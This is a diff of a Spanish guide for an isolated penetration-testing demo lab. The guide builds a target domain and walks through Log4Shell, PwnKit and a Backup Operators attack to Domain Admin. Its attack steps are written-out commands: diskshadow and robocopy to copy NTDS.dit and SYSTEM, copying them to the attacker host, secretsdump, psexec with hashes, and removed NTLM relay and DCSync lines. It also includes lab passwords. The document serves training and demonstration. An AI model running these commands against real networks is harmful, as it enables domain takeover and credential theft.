@@ -17,19 +17,18 @@ explotación, en orden. Los valores (IPs, dominio, puertos, credenciales) viven 
 | **host** | ParrotOS (tu PC) | **atacante + control** | `BIFROST_IP_ATTACKER` · `.66` |
 | `scanner` | Ubuntu + Nessus | escáner enlazado a Tenable One | `.10` |
 | `web01` | Ubuntu 20.04 | Solr (Log4Shell) + PwnKit + credenciales | `.20` |
-| `dc01` | Windows Server 2019 | AD DS + ADCS → ESC8 | `.30` |
-| `ws01` | Windows 10 | credenciales señuelo | `.31` |
+| `dc01` | Windows Server 2019 | AD DS + Backup Operators (NTDS.dit) | `.30` |
 
 **El atacante eres tú, desde el host** a través de la interfaz host-only (VMnet1).
 No hay máquina Kali: simplifica la implementación y evita la fricción de Kali en
 VMware.
 
-### La cadena (4 puentes, 3 máquinas objetivo)
+### La cadena (4 puentes, 2 máquinas objetivo)
 
 1. **Log4Shell** → shell como `solr` en `web01`.
 2. **Privesc** → credenciales de `svc_app` en la config del core → `su svc_app` → **PwnKit** → `root` en `web01`.
-3. **Lateral** → credenciales de dominio `svc_backup` en `/opt/app/config.yml` → acceso a `ws01`.
-4. **ESC8** → relay NTLM a ADCS → certificado de `dc01$` → DCSync → **Domain Admin**.
+3. **Credenciales** → `svc_backup` en `/opt/app/config.yml` → credencial de dominio válida.
+4. **Backup Operators** → `svc_backup` en `Backup Operators` + RDP al DC → `NTDS.dit` → **Domain Admin**.
 
 ---
 
@@ -43,7 +42,6 @@ Red **host-only** `10.10.0.0/24`: sin router ni salida a internet.
 | scanner | `10.10.0.10` | ninguno (la NIC NAT da el suyo por DHCP) | `10.10.0.30` (opcional) |
 | web01 | `10.10.0.20` | **ninguno** | `10.10.0.30` (dc01) |
 | dc01 | `10.10.0.30` | ninguno | `127.0.0.1` (él mismo) |
-| ws01 | `10.10.0.31` | ninguno | `10.10.0.30` (dc01) |
 
 **Claves para no confundirte:**
 
@@ -54,8 +52,8 @@ Red **host-only** `10.10.0.0/24`: sin router ni salida a internet.
 - **La IP del atacante NO tiene que ser `.1`.** El `.1` es solo la convención con
   la que VMware asigna el adaptador del host (VMnet1). En host-only el host puede
   estar en cualquier IP libre del segmento (aquí `.66`). Solo evita chocar con
-  `.10/.20/.30/.31`.
-- **DNS**: `dc01` es el DNS del dominio. `ws01` y `web01` apuntan a él; `dc01`
+  `.10/.20/.30`.
+- **DNS**: `dc01` es el DNS del dominio. `web01` apunta a él; `dc01`
   apunta a sí mismo (`127.0.0.1`). El host y el scanner no lo necesitan en VMnet1
   (el scanner obtiene el suyo por la NIC NAT).
 
@@ -73,7 +71,7 @@ Red **host-only** `10.10.0.0/24`: sin router ni salida a internet.
 | Python | 3.8 + `requests` | 3.10+ |
 
 > **Fusion 13.x en Mac Intel** también sirve, pero **Apple Silicon no puede correr
-> `dc01`/`ws01`** (son x86). En Windows, excluye la carpeta de VMs del antivirus.
+> `dc01`** (es x86). En Windows, excluye la carpeta de VMs del antivirus.
 
 ---
 
@@ -276,86 +274,46 @@ cd exploits/log4shell && ./build.sh && ./selftest.sh
 .\dc01-promote.ps1    # red + rename -> reinicia
 .\dc01-promote.ps1    # AD DS + promocion -> reinicia
 .\dc01-promote.ps1    # OU/usuarios/corona -> "dc01 listo"
-
-.\adcs-esc8.ps1       # si pide reinicio, reinicia y repite
-Get-Service CertSvc   # Running
-Install-AdcsWebEnrollment -Force   # el script puede saltarselo (nota)
-.\adcs-esc8.ps1       # anon OFF / NTLM ON / SSL OFF
 ```
 
-> El chequeo de Web Enrollment del script original miraba
-> `C:\Windows\System32\CertSrv\CertEnroll`, carpeta que crea el propio CA;
-> ahora comprueba la aplicación `/CertSrv` en IIS. Si el role quedó a medias y
-> responde «already installed», ejecuta `Uninstall-AdcsWebEnrollment -Force` y
-> vuelve a lanzar. El `RestartNeeded` de las features es normal: reinicia.
+4. **Configura la vía de escalada (Backup Operators + RDP)** en el DC:
+
+```powershell
+Add-ADGroupMember -Identity 'Backup Operators' -Members svc_backup
+Add-ADGroupMember -Identity 'Remote Desktop Users' -Members svc_backup
+Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
+```
+
+> En un DC, el derecho **"Allow log on through Remote Desktop Services"**
+> (`SeRemoteInteractiveLogonRight`) solo incluye a **Administrators**; el grupo
+> `Remote Desktop Users` **no basta**. Añade `CORP\svc_backup` en
+> `gpmc.msc` → **Default Domain Controllers Policy** → Edit → Computer
+> Configuration → Policies → Windows Settings → Security Settings → Local
+> Policies → User Rights Assignment → *Allow log on through Remote Desktop
+> Services*; luego `gpupdate /force` en el DC.
+
+> `svc_backup` es la cuenta de copias: en el DC queda en `Backup Operators`
+> (`SeBackupPrivilege`, para leer `NTDS.dit`) y en `Remote Desktop Users` (para
+> entrar por RDP y ejecutar `diskshadow`). Es la configuración que convierte una
+> cuenta de servicio en la vía al `krbtgt`. ADCS/ESC8 ya no forma parte del
+> flujo; `adcs-esc8.ps1` se conserva como legado.
 
 **Gate 4** (en `dc01`):
 
 ```powershell
 Get-ADDomain | Select-Object Name                    # corp.local
-Get-Service CertSvc                                  # Running
-Get-WebApplication -Site 'Default Web Site'          # /CertSrv
-Invoke-WebRequest http://localhost/certsrv/ -UseBasicParsing
-# 401 (o 401.2) = correcto: existe, pide NTLM, NO exige TLS
-certutil -CATemplates | Select-String DomainController
+Get-ADGroupMember 'Backup Operators' | Select-Object Name
+Get-ADGroupMember 'Remote Desktop Users' | Select-Object Name
+(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections  # 0
 Test-Path C:\Corp\Finanzas                           # en la misma ventana elevada
 ```
 
-El `Auto-Enroll: Access is denied` de `certutil` es el permiso de
-auto-inscripción del usuario actual, no la disponibilidad de la plantilla.
-
-### Paso 4 — ws01
-
-**En:** `VMware GUI` + consola de `ws01`.
-
-1. VM Windows 10 **Pro** (Home no puede unirse a un dominio), 2 vCPU / 4 GB /
-   60 GB, **una sola NIC: VMnet1**, VMware Tools. Si el OOBE exige red,
-   `Shift+F10` → `OOBE\BYPASSNRO` y cuenta local. Si usas una NAT para instalar,
-   **desconéctala** antes del script: el script elige el primer adaptador `Up`.
-2. Copia `config\` y `windows\` a `C:\Bifrost\` y prepara la sesión:
-
-```powershell
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-Get-ChildItem C:\Bifrost -Recurse -File | Unblock-File
-```
-
-3. Red y hora: el script pone `10.10.0.31/24`, DNS `10.10.0.30` y el gateway
-   nominal. Comprueba `Resolve-DnsName corp.local` y arranca el reloj
-   (`Start-Service w32time; w32tm /config /syncfromflags:domhier /update`).
-4. Ejecuta y relanza tras cada reinicio (rename → join → seed) hasta
-   `ws01 listo`:
-
-```powershell
-.\ws01-join.ps1
-```
-
-   El script ya quita la ruta por defecto antes de recrear el gateway
-   (evita `Instance DefaultGateway already exists`). Para el login de dominio,
-   en la pantalla de inicio usa **Otro usuario** → `CORP\Administrator` /
-   `Bifrost-Admin-2026!`; para la siembra vale la cuenta local.
-
-   El share se crea con el SID de Everyone (funciona también en Windows en
-   español, «Todos») y el script abre el 445. Si el SMB no responde:
-   `New-NetFirewallRule -DisplayName 'Bifrost SMB-In' -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow`.
-
-**Gate 5** (en `ws01`, luego `host`):
-
-```powershell
-(Get-CimInstance Win32_ComputerSystem).Domain    # corp.local
-Get-SmbShare -Name Compartido
-```
-
 ```bash
-# en el host
-source ~/bifrost/env.sh
-nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
+nxc rdp "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # Pwn3d!
 ```
 
-> `svc_backup` es usuario de dominio, **no** admin local de ws01: `--lsa` y
-> `evil-winrm` con esa cuenta no funcionan (la guía los marca «si hay admin
-> local»). El puente 3 es la lectura del share y los señuelos de `IT\`.
-
-### Paso 5 — Prueba de humo del escaneo
+### Paso 4 — Prueba de humo del escaneo
 
 **En:** `host` (API) o `Tenable UI` (visual).
 
@@ -364,10 +322,10 @@ python tenable/tenable_scan.py --action run --name "Bifrost smoke" --out out/smo
 ```
 
 **Alternativa por UI (sin API keys):** `cloud.tenable.com` → **Scans → New
-Scan** → política `Bifrost-Demo` → targets `10.10.0.20,10.10.0.30,10.10.0.31`
+Scan** → política `Bifrost-Demo` → targets `10.10.0.20,10.10.0.30`
 → scanner `10.10.0.10` → **Launch**. Al terminar, **Export → Nessus**.
 
-**Gate 6:** termina `completed` y el resumen tiene un **Crítico** en
+**Gate 5:** termina `completed` y el resumen tiene un **Crítico** en
 `BIFROST_IP_WEB` (Log4Shell, plugins 155999/156057; el 168496 es el RCE de
 Solr en 8983).
 
@@ -378,9 +336,13 @@ Si exportas desde la UI, Tenable puede partir cada host en varios `ReportHost`
 python tenable/tenable_scan.py --action summary --file out/Bifrost_Smoke.nessus --out out/smoke.md
 ```
 
-### Paso 6 — Snapshots y ensayo
+### Paso 5 — Snapshots y ensayo
 
-1. **Retira la NIC NAT** de `web01` y el 22 temporal si lo abriste. Comprueba
+1. **Retira la NIC NAT** de `web01` y el 22 temporal si lo abriste.
+
+> Si ya no usas la VM de respaldo, borra/archiva su carpeta en `vms/`:
+> `./bifrost.sh status` y `snapshot all` solo tocan las VMs presentes
+> (scanner, web01, dc01). Comprueba
    que `ip -br a` solo tiene `10.10.0.20` y que `sudo ufw status` solo deja
    8983.
 2. Apaga las VMs y toma los snapshots (el comando acepta la etiqueta):
@@ -437,52 +399,71 @@ Si no precompilaste `/opt/pk` (paso 2) y la VM todavía tiene red:
 El kernel debe ser el `5.4.0-26` (ver paso 2); con el `5.4.0-124`+ el `argc=0`
 está mitigado y PwnKit imprime el `usage` de pkexec.
 
-### Puente 3 — Lateral (ws01)
+### Puente 3 — Credenciales de dominio (`svc_backup`)
 
-En la shell de `web01` (o con lo que leíste):
+En la shell de `web01` (root):
 
 ```bash
 cat /opt/app/config.yml                                  # -> svc_backup / Verano2024!
 ```
 
-De vuelta en el **host**:
+De vuelta en el **host**, valida la credencial contra el DC:
 
 ```bash
-nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
-nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --lsa   # requiere admin local
-evil-winrm -i "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # si svc_backup fuera admin
+nxc smb "$TARGET_DC" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"
 ```
 
-> `svc_backup` no es admin local de ws01; el valor del puente 3 es la lectura
-> del share `Compartido` y sus señuelos.
+### Puente 4 — Backup Operators + NTDS.dit → Domain Admin
 
-### Puente 4 — ESC8 → Domain Admin
+**RDP al DC como `svc_backup` (el DC exige NLA):**
 
 ```bash
-# terminal 1: relay. En Parrot el binario es impacket-ntlmrelayx; el script
-# attacker-tools.sh deja también ntlmrelayx.py y abre el 445 en ufw.
-ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
-  -smb2support --adcs --template DomainController -l ~/bifrost/loot
-
-# terminal 2: coacción (PetitPotam no viene en impacket; lo clona attacker-tools.sh)
-PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" "$LHOST" "$TARGET_DC"
-
-# terminal 3: certificado -> hash (el PFX suele ser DC01$.pfx)
-certipy auth -pfx ~/bifrost/loot/DC01\$.pfx -dc-ip "$TARGET_DC"
-# para enumerar: certipy find -u "$BIFROST_SVC_USER@$BIFROST_DOMAIN" -p "$BIFROST_SVC_PASS" \
-#   -dc-ip "$TARGET_DC" -ldap-scheme ldap -vulnerable
-
-# DCSync
-secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>
-
-# impacto
-psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
-dir C:\Corp\Finanzas
+xfreerdp3 /v:"$TARGET_DC" /u:'svc_backup' /d:'corp.local' /p:'Verano2024!' /cert:ignore /sec:nla \
+  /drive:loot,/home/bard/bifrost/loot
 ```
 
-> El relay escucha en **445/tcp**: si el ufw del host está activo debe permitir
-> `from 10.10.0.0/24 to any port 445 proto tcp` (lo hace `attacker-tools.sh`).
-> `--output-folder` no existe en impacket 0.12: el loot se guarda con `-l`.
+**En el DC — `diskshadow` interactivo:**
+
+```powershell
+diskshadow
+set context persistent nowriters
+add volume c: alias ntds
+create
+expose %ntds% z:
+exit
+```
+
+**Copiar `NTDS.dit` y `SYSTEM`:**
+
+```powershell
+robocopy /b z:\Windows\NTDS C:\Users\svc_backup ntds.dit
+robocopy /b z:\Windows\System32\config C:\Users\svc_backup SYSTEM
+```
+
+**Exfiltrar al host como `svc_backup` y volcar:**
+
+```powershell
+copy C:\Users\svc_backup\ntds.dit \\tsclient\loot\ntds.dit
+copy C:\Users\svc_backup\SYSTEM  \\tsclient\loot\SYSTEM
+```
+
+```bash
+impacket-secretsdump -ntds /home/bard/bifrost/loot/ntds.dit \
+  -system /home/bard/bifrost/loot/SYSTEM LOCAL
+```
+
+> Antes del `copy`, en el host: `chmod 777 /home/bard/bifrost/loot`.
+> Alternativa sin RDP: `impacket-smbserver loot /home/bard/bifrost/loot -smb2support -username svc -password 'Verano2024!'`
+> en el host y `copy` a `\\10.10.0.66\loot\...` desde el DC (sin credenciales el DC bloquea el guest).
+
+> `robocopy /b` habilita `SeBackupPrivilege`; `reg save HKLM\SYSTEM` no lo hace y
+> con `svc_backup` da `Access is denied`. Sin `SYSTEM` (`BootKey`) no se descifra.
+
+**Cerrar sesión:**
+
+```bash
+impacket-psexec -hashes :<HASH_ADMIN> 'corp.local/Administrator@'"$TARGET_DC"
+```
 
 ---
 
@@ -512,8 +493,8 @@ dir C:\Corp\Finanzas
 | El escaneo tarda | muestra el `.nessus` pre-exportado |
 | Puente 1: LDAP no devuelve shell | `selftest.sh`; si falla, clip grabado |
 | Puente 2: PwnKit parcheado | usa `sudo -l` si hay misconfig, o clip |
-| Puente 3: sin sesión en ws01 | cuéntalo con el diagrama y pasa al 4 |
-| Puente 4: relay no recibe | repite la coacción; si falla, clip |
+| Puente 3: credencial inválida | revisa `/opt/app/config.yml` y `nxc smb` al DC |
+| Puente 4: RDP no entra | `Remote Desktop Users` + `fDenyTSConnections=0`; `nxc rdp` |
 | ZeroLogon deja el DC roto | snapshot + `reset all` |
 
 **Frase comodín:** *"esto es exactamente lo que pasa en producción: el exploit no
@@ -532,20 +513,13 @@ siempre funciona a la primera. Se cambia de técnica y se sigue."*
 | `host` | `selftest.sh` FALLO sin conexión LDAP | `curl` sin `-g` se come las llaves de `${jndi:...}` | ya corregido en `selftest.sh`/`ldap-serve.sh`/GUIDE |
 | `web01` | PwnKit imprime el `usage` de pkexec | kernel con mitigación *argv=0* (≥5.4.0-124) | arrancar el `5.4.0-26` desde GRUB |
 | `web01` | `policykit-1` ≥ 0.105-26ubuntu1.2 | actualizaciones aplicadas | downgrade a `0.105-26ubuntu1` + `apt-mark hold` |
-| `dc01` | `adcs-esc8.ps1` repite «Se requiere reinicio» | features pendientes de reboot | reiniciar y relanzar |
-| `dc01` | `/certsrv/` da 404 tras el CA | el script se saltaba Web Enrollment (`CertEnroll`) | `Install-AdcsWebEnrollment -Force` (script corregido) |
-| `dc01` | `Install-AdcsWebEnrollment` «already installed» | role a medias | `Uninstall-AdcsWebEnrollment -Force` e instalar |
-| `ws01` | `New-NetIPAddress ... DefaultGateway already exists` | ruta por defecto de una pasada anterior | script corregido; o `Remove-NetRoute ... 0.0.0.0/0` |
-| `ws01` | `Add-Computer` «domain does not exist» | DNS/hora o NAT arriba | `Resolve-DnsName corp.local`; solo VMnet1; `w32time` |
-| `ws01` | la siembra falla con `Everyone` | Windows en español («Todos») | el script usa el SID; a mano, SID/Todos |
-| `ws01` | `nxc smb` no conecta | firewall 445 | `New-NetFirewallRule ... -LocalPort 445` |
 | `scanner` | `disconnected` | NIC NAT del scanner caída | `curl https://cloud.tenable.com` |
 | `scanner` | credenciales Windows inválidas (104410) | `CORP\Administrator` con Domain vacío | usuario `Administrator`, domain `CORP`; Remote Registry/admin shares |
 | `host` | escaneo sin Crítico | política sin credenciales/plugins | revisar política y familia Web Servers |
-| `host` | relay no recibe | `certsrv` redirige a HTTPS o falta el 445 | repetir `adcs-esc8.ps1` §4; `ufw allow ... 445` |
-| `host` | `ntlmrelayx.py`/`PetitPotam.py` no existen | impacket usa `impacket-*`; PetitPotam no viene | `attacker-tools.sh` crea symlinks/clona |
-| `host` | `certipy find` da timeout/SSL reset | LDAPS por defecto o DNS del DC | `-ldap-scheme ldap`; `/etc/hosts` con `DC01.corp.local` |
-| `dc01`/`ws01` | Kerberos falla | reloj desincronizado | `w32tm /resync` |
+| `dc01` | `svc_backup` no puede RDP | no está en `Remote Desktop Users` o RDP apagado | `Add-ADGroupMember`; `fDenyTSConnections=0`; `Enable-NetFirewallRule 'Remote Desktop'` |
+| `dc01` | `diskshadow`/`robocopy /b` da acceso denegado | falta `SeBackupPrivilege` | `Add-ADGroupMember 'Backup Operators'`; cierra sesión y vuelve a entrar |
+| `host` | `secretsdump -ntds -system` no descifra | `SYSTEM` de otro DC o corrupto | copia el `SYSTEM` del mismo DC |
+| `dc01` | Kerberos falla | reloj desincronizado | `w32tm /resync` |
 
 ---
 
@@ -555,13 +529,12 @@ Claves de `config/lab.env`. Cambia ahí y en ningún otro sitio.
 
 | Clave | Default | Uso |
 |---|---|---|
-| `BIFROST_VERSION` | `1.1.0` | informativo |
+| `BIFROST_VERSION` | `1.1.1` | informativo |
 | `BIFROST_NETWORK` / `BIFROST_PREFIX` / `BIFROST_GATEWAY` | `10.10.0.0` / `24` / `.1` (nominal) | red aislada |
 | `BIFROST_IP_ATTACKER` | `.66` | host atacante (VMnet1) |
 | `BIFROST_IP_SCANNER` | `.10` | Nessus |
 | `BIFROST_IP_WEB` | `.20` | web01 |
 | `BIFROST_IP_DC` | `.30` | dc01 |
-| `BIFROST_IP_WS` | `.31` | ws01 |
 | `BIFROST_DOMAIN` / `BIFROST_NETBIOS` | `corp.local` / `CORP` | dominio |
 | `BIFROST_DOMAIN_ADMIN` / `_PASS` | `Administrator` / `Bifrost-Admin-2026!` | union al dominio |
 | `BIFROST_DSRM_PASS` | `Bifrost-DSRM-2026!` | modo restauracion |
@@ -574,7 +547,6 @@ Claves de `config/lab.env`. Cambia ahí y en ningún otro sitio.
 | `BIFROST_TENABLE_POLICY` | `Bifrost-Demo` | política de escaneo |
 | `BIFROST_TENABLE_BASE_URL` / `_KEYS_FILE` | `cloud.tenable.com` / vacío | API |
 | `BIFROST_CROWN_JEWEL` | `C:\Corp\Finanzas` | joya de la corona |
-| `BIFROST_SHARE_PATH` | `C:\Compartido` | share de ws01 |
 
 > Credenciales de la API de Tenable **no** van en `lab.env`: viven en
 > `~/.bifrost/tenable.json` (fuera del repo).
